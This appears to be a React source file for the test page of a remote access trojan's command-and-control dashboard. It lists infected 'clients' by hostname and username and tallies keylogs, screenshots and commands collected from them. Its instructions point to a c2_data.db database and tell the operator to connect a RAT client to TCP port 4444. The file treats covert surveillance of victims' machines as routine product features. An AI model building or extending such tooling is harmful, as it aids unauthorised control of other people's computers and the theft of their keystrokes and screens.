import { DatabaseStatsPanel } from '../../UI/DatabaseStatsPanel';
import { useClientsQuery, useStatisticsQuery } from '../../hooks/useDatabaseQuery';

export function DatabaseTestPage() {
  const { data: clients, isLoading: clientsLoading } = useClientsQuery(10);
  const { data: stats, isLoading: statsLoading } = useStatisticsQuery();

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-gray-900 mb-2">Database Test Page</h1>
        <p className="text-gray-600 mb-8">
          This page demonstrates the database features we've implemented.
        </p>

        {/* Database Stats Panel */}
        <div className="mb-8">
          <h2 className="text-xl font-semibold text-gray-800 mb-4">Database Statistics</h2>
          <DatabaseStatsPanel />
        </div>

        {/* Raw Data Display */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Clients Table */}
          <div className="bg-white rounded-lg shadow p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-4">Clients from Database</h2>
            {clientsLoading ? (
              <div className="space-y-3">
                {[1, 2, 3].map((i) => (
                  <div key={i} className="h-8 bg-gray-200 rounded animate-pulse"></div>
                ))}
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="min-w-full divide-y divide-gray-200">
                  <thead>
                    <tr>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ID</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Hostname</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Username</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200">
                    {clients && clients.length > 0 ? (
                      clients.map((client: any) => (
                        <tr key={client.id}>
                          <td className="px-4 py-3 text-sm text-gray-900 font-mono">{client.id.substring(0, 8)}...</td>
                          <td className="px-4 py-3 text-sm text-gray-900">{client.hostname || 'Unknown'}</td>
                          <td className="px-4 py-3 text-sm text-gray-900">{client.username || 'Unknown'}</td>
                          <td className="px-4 py-3">
                            <span className={`px-2 py-1 text-xs rounded-full ${client.is_online ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'}`}>
                              {client.is_online ? 'Online' : 'Offline'}
                            </span>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr>
                        <td colSpan={4} className="px-4 py-8 text-center text-gray-500">
                          No clients found in database. Connect a RAT client to see data here.
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            )}
          </div>

          {/* Statistics Raw Data */}
          <div className="bg-white rounded-lg shadow p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-4">Raw Statistics Data</h2>
            {statsLoading ? (
              <div className="space-y-3">
                {[1, 2, 3, 4].map((i) => (
                  <div key={i} className="h-6 bg-gray-200 rounded animate-pulse"></div>
                ))}
              </div>
            ) : (
              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-gray-50 p-4 rounded">
                    <div className="text-sm text-gray-500">Total Clients</div>
                    <div className="text-2xl font-bold">{stats?.totalClients || 0}</div>
                  </div>
                  <div className="bg-gray-50 p-4 rounded">
                    <div className="text-sm text-gray-500">Online Clients</div>
                    <div className="text-2xl font-bold text-green-600">{stats?.onlineClients || 0}</div>
                  </div>
                </div>
                
                <div className="border-t pt-4">
                  <h3 className="font-medium text-gray-700 mb-2">Recent Activity (24h)</h3>
                  <div className="grid grid-cols-3 gap-3">
                    <div className="text-center p-3 bg-blue-50 rounded">
                      <div className="text-lg font-bold">{stats?.recentActivity?.screenshots || 0}</div>
                      <div className="text-xs text-gray-600">Screenshots</div>
                    </div>
                    <div className="text-center p-3 bg-purple-50 rounded">
                      <div className="text-lg font-bold">{stats?.recentActivity?.keylogs || 0}</div>
                      <div className="text-xs text-gray-600">Keylogs</div>
                    </div>
                    <div className="text-center p-3 bg-orange-50 rounded">
                      <div className="text-lg font-bold">{stats?.recentActivity?.commands || 0}</div>
                      <div className="text-xs text-gray-600">Commands</div>
                    </div>
                  </div>
                </div>

                <div className="border-t pt-4">
                  <h3 className="font-medium text-gray-700 mb-2">Database Info</h3>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-gray-600">Database Size:</span>
                      <span className="font-mono">
                        {(() => {
                          const bytes = stats?.databaseSize || 0;
                          if (bytes === 0) return '0 B';
                          const k = 1024;
                          const sizes = ['B', 'KB', 'MB', 'GB'];
                          const i = Math.floor(Math.log(bytes) / Math.log(k));
                          return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
                        })()}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Total Screenshots:</span>
                      <span className="font-bold">{stats?.totalScreenshots || 0}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Total Keylogs:</span>
                      <span className="font-bold">{stats?.totalKeylogs || 0}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Total Commands:</span>
                      <span className="font-bold">{stats?.totalCommands || 0}</span>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Instructions */}
        <div className="mt-8 bg-blue-50 border border-blue-200 rounded-lg p-6">
          <h2 className="text-lg font-semibold text-blue-800 mb-2">How to Test</h2>
          <ul className="list-disc pl-5 space-y-2 text-blue-700">
            <li>The bridge server is running on port 8080 (WebSocket) and 4444 (TCP)</li>
            <li>Database is located at: <code className="bg-blue-100 px-1 rounded">c2_data.db</code></li>
            <li>Connect a RAT client to TCP port 4444 to populate the database</li>
            <li>Database statistics will update automatically every 30 seconds</li>
            <li>Click "Refresh" button on stats panel to manually update</li>
            <li>All data is persisted in SQLite database across server restarts</li>
          </ul>
        </div>

        {/* Connection Status */}
        <div className="mt-8">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-semibold text-gray-800">Connection Status</h2>
              <p className="text-gray-600">Bridge server and database connectivity</p>
            </div>
            <div className="flex items-center space-x-4">
              <div className="flex items-center">
                <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                <span className="text-sm">Bridge Server: Running</span>
              </div>
              <div className="flex items-center">
                <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                <span className="text-sm">Database: Connected</span>
              </div>
              <div className="flex items-center">
                <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                <span className="text-sm">WebSocket: Connected</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}